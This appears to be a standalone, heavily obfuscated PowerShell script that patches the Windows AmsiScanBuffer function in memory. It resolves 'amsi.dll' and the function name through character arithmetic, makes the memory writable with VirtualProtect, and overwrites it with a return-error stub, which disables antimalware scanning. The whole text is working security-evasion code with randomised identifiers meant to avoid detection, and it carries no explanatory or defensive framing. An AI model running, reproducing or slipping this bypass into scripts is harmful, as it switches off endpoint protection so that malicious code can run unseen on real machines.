$TRkXfYM4sGW4Ph_s = @"
using System;
using System.Runtime.InteropServices;
public class TRkXfYM4sGW4Ph_s {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ysDl9lDia42Pc, string SY6NWPTQo);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr L5xmfo7ATw23Wu5WCfNT, UIntPtr ye2DdX0Dunap12g, uint U6k4IrMncdQxI, out uint MSm4XfzNLbgRHSfzN);
}
"@

Add-Type $TRkXfYM4sGW4Ph_s

$NOhanFdgkDZdPelQP6 = [TRkXfYM4sGW4Ph_s]::LoadLibrary("$(('ãms'+'í.d'+'ll').nORmAlizE([ChAr](70+37-37)+[Char](111*95/95)+[ChAr]([byTE]0x72)+[ChAr](17+92)+[char]([bYTe]0x44)) -replace [ChaR](38+54)+[ChAr]([bYTe]0x70)+[char](123)+[ChAR]([BYte]0x4d)+[chAr]([ByTe]0x6e)+[CHAR](14+111))")
$qZYAsc_Tj = [TRkXfYM4sGW4Ph_s]::GetProcAddress($NOhanFdgkDZdPelQP6, "$(('ÀmsìScânB'+'ûffér').noRMALIze([cHaR](70)+[cHar](39+72)+[ChaR](114*55/55)+[CHar]([BYte]0x6d)+[CHAR]([byTE]0x44)) -replace [cHAr]([byTe]0x5c)+[chAr](112*90/90)+[chAR]([bYTe]0x7b)+[cHar]([byTE]0x4d)+[ChAR](19+91)+[CHAR]([ByTE]0x7d))")
$p = 0
[TRkXfYM4sGW4Ph_s]::VirtualProtect($qZYAsc_Tj, [uint32]5, 0x40, [ref]$p)
$mJE = "0xB8"
$Q7e2UdJSo = "0x57"
$O5YtfmilR86hJWAnZ4Ro = "0x00"
$OIXJyLeMAXRqRKUKCSj = "0x07"
$PQDNBaeoJC8zMLiDTzI = "0x80"
$OBvTYnL0c0mWBI = "0xC3"
$wYgBF = [Byte[]] ($mJE,$Q7e2UdJSo,$O5YtfmilR86hJWAnZ4Ro,$OIXJyLeMAXRqRKUKCSj,+$PQDNBaeoJC8zMLiDTzI,+$OBvTYnL0c0mWBI)
[System.Runtime.InteropServices.Marshal]::Copy($wYgBF, 0, $qZYAsc_Tj, 6)